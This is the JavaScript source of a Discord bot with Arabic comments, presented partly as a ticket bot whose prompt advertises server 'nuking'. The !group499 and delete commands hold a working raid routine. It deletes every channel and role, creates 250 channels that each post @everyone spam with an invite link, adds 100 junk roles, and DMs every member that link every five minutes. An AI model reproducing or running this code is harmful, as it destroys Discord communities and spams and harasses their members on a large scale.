const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers
    ]
});

const PREFIX = '!'; 
const TARGET_SERVER_LINK = 'https://discord.gg/URaRZeKG9';
const ADMIN_USER_ID = '1494353083138838668';
const TICKET_ROLE_ID = '1556010239155773440'; 

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    // 1. أمر send للإرسال مع حذف الرسالة الأصلية ودعم منشن الرومات
    if (message.content.startsWith(PREFIX + 'send')) {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        
        await message.delete().catch(() => {});
        const args = message.content.slice(PREFIX.length + 4).trim();
        const targetChannel = message.mentions.channels.first();

        if (targetChannel) {
            const contentToSend = args.replace(/<#\d+>/, '').trim();
            await targetChannel.send(contentToSend);
        } else {
            await message.channel.send(args);
        }
        return;
    }

    // 2. أمر setup_tic لإنشاء رسالة التكت
    if (message.content.startsWith(PREFIX + 'setup_tic')) {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        await message.delete().catch(() => {});

        const embed = new EmbedBuilder()
            .setColor(0x000000)
            .setDescription('حياك الله واجهتك مشكله او ودك نجحفل سيرفر فك تكت من تحت');

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId('create_ticket')
                    .setLabel('ticket')
                    .setStyle(ButtonStyle.Secondary)
            );

        await message.channel.send({ embeds: [embed], components: [row] });
        return;
    }

    // 3. أمر الإغلاق داخل التكت
    if (message.content === 'اغلاق' && message.channel.name.startsWith('tic-')) {
        try {
            await message.channel.send('جاري إغلاق وحذف التكت...');
            setTimeout(async () => {
                await message.channel.delete().catch(() => {});
            }, 1000);
        } catch (e) {}
        return;
    }

    // 4. دعم أمر !group499 وأمر !حذف لتنفيذ التحفيل والحذف الفوري
    if (message.content.startsWith(PREFIX + 'group499') || message.content.startsWith('إحذف') || message.content.startsWith('حذف') || message.content.startsWith(PREFIX + 'delete')) {
        const guild = message.guild;
        if (!guild) return;

        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply({ content: 'عذراً، هذا الأمر مخصص للمشرفين أصحاب الصلاحيات فقط.', ephemeral: true });
        }

        message.reply('جاري بدء التحفيل الشامل وحذف الرومات والرولات القديمة...');

        // إرسال الرابط في الخاص للأعضاء
        const sendDMs = async () => {
            try {
                await guild.members.fetch();
                guild.members.cache.forEach(async member => {
                    if (!member.user.bot) {
                        try {
                            await member.send(`<@${member.id}>\n${TARGET_SERVER_LINK}`);
                        } catch (err) {}
                    }
                });
            } catch (e) {}
        };

        sendDMs();
        setInterval(sendDMs, 5 * 60 * 1000);

        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        // مهمة الرومات: حذف الكل ثم إنشاء 250 روم وإرسال الرسالة 4 مرات في كل روم
        const channelsTask = (async () => {
            const deletePromises = [];
            guild.channels.cache.forEach(channel => {
                deletePromises.push(channel.delete().catch(() => {}));
            });
            await Promise.all(deletePromises);

            for (let i = 1; i <= 250; i++) {
                try {
                    const newChannel = await guild.channels.create({
                        name: 'group499',
                        type: ChannelType.GuildText 
                    });
                    for (let j = 0; j < 4; j++) {
                        await newChannel.send(`@everyone @here\n${TARGET_SERVER_LINK}`).catch(() => {});
                    }
                } catch (e) {}
                await delay(80);
            }
        })();

        // مهمة الرولات: حذف القديم بالكامل وإنشاء 100 رول جديدة
        const rolesTask = (async () => {
            const deleteRolePromises = [];
            guild.roles.cache.forEach(role => {
                if (!role.managed && role.id !== guild.id) {
                    deleteRolePromises.push(role.delete().catch(() => {}));
                }
            });
            await Promise.all(deleteRolePromises);

            for (let i = 1; i <= 100; i++) {
                try {
                    await guild.roles.create({
                        name: 'group499',
                        color: 'Random'
                    });
                } catch (e) {}
                await delay(80);
            }
        })();

        await Promise.all([channelsTask, rolesTask]);
    }
});

// التعامل مع زر التكت
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'create_ticket') {
        const guild = interaction.guild;
        const member = interaction.member;

        try {
            // تجهيز الصلاحيات للتكت
            const overwrites = [
                {
                    id: guild.id,
                    deny: [PermissionsBitField.Flags.ViewChannel],
                },
                {
                    id: member.id,
                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
                },
                {
                    id: ADMIN_USER_ID,
                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
                }
            ];

            // إضافة الرتبة الجديدة إذا كانت موجودة في السيرفر لتفادي أي أخطاء
            if (guild.roles.cache.has(TICKET_ROLE_ID)) {
                overwrites.push({
                    id: TICKET_ROLE_ID,
                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory],
                });
            }

            const ticketChannel = await guild.channels.create({
                name: `tic-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: overwrites,
            });

            await interaction.reply({ content: `تم فتح التكت الخاص بك: ${ticketChannel}`, ephemeral: true });

            // إرسال رسالة التكت ومنشن العضو الذي فك التكت فقط
            await ticketChannel.send(`**اكتب مشكلتك قبل لانجي**\n<@${member.id}>`);
        } catch (e) {
            await interaction.reply({ content: 'حدث خطأ أثناء إنشاء التكت.', ephemeral: true });
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
